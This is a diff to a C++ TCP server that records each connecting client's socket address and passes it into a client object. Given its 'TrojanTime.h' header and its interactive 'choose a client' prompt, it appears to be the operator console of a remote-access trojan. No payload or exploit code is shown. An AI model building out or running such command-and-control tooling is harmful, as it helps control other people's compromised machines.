@@ -17,12 +17,17 @@
 #include "client.h"
 #include "clients.h"
 #include "TrojanTime.h"
+#include <netinet/in.h>
 
 /*
  * read from a FD (int) and save data in std::string
  * until EOL was received
  */
-std::map<int, std::string> mapReadLineFromFD;
+struct ReadLineAndSockAddr {
+	std::string strLine;
+	sockaddr_in sa_in;
+};
+std::map<int, ReadLineAndSockAddr> mapReadLineFromFD;
 std::vector<pollfd> vecPollFDs;
 Clients clients;
 
@@ -123,7 +128,9 @@ int SetupListenSoket(int port) {
 
 void AddNewIncomingConnection(std::vector<pollfd>& vecPollFDs, unsigned int index) {
 	do {
-		int new_sd = accept(vecPollFDs[index].fd, NULL, NULL);
+		sockaddr_in sa_in;
+		socklen_t len = sizeof(sa_in);
+		int new_sd = accept(vecPollFDs[index].fd, (sockaddr*)&sa_in, &len);
 		if (new_sd < 0) {
 			if (errno != EWOULDBLOCK) {
 				perror("  accept() failed");
@@ -131,6 +138,7 @@ void AddNewIncomingConnection(std::vector<pollfd>& vecPollFDs, unsigned int inde
 			}
 			break;
 		}
+		mapReadLineFromFD[new_sd].sa_in = sa_in;
 		clients.PrintInfo(std::string("Incoming connection, fd=") + std::to_string(new_sd));
 		SetFDnoneBlocking(new_sd);
 		vecPollFDs.push_back(pollfd { new_sd, POLLIN });
@@ -163,7 +171,7 @@ void ReadDataFromClient(std::vector<pollfd>& vecPollFDs, const unsigned int inde
 			break;
 		} else {	//read a data
 			if (byteRead == '\n') {
-				std::string& strLine = mapReadLineFromFD[vecPollFDs[index].fd];
+				std::string& strLine = mapReadLineFromFD[vecPollFDs[index].fd].strLine;
 				//printf("readline: %s\n", strLine.c_str());
 				if (client) {
 					auto activeClient = clients.GetActiveClient();
@@ -171,12 +179,13 @@ void ReadDataFromClient(std::vector<pollfd>& vecPollFDs, const unsigned int inde
 					if (client->get().GetStrID() == activeClient->get().GetStrID())
 						clients.PrintPrompt();
 				} else {
-					if (auto iFD_replaced = clients.AddClient(Client(strLine, vecPollFDs[index].fd)))
+					if (auto iFD_replaced = clients.AddClient(Client(strLine, vecPollFDs[index].fd,
+							mapReadLineFromFD[vecPollFDs[index].fd].sa_in)))
 						AddFD2BeClosed(*iFD_replaced);
 				}
 				strLine = "";
 			} else {
-				mapReadLineFromFD[vecPollFDs[index].fd] += byteRead;
+				mapReadLineFromFD[vecPollFDs[index].fd].strLine += byteRead;
 			}
 		}
 	} while (true);
@@ -201,7 +210,7 @@ void HandleStdinRead() {
 		} else {
 			clients.PrintClients();
 			std::cout << "choose a client:";
-			std::cin >> str;
+			std::getline(std::cin, str);
 			clients.SetActiveClient(str);
 		}
 	} else {
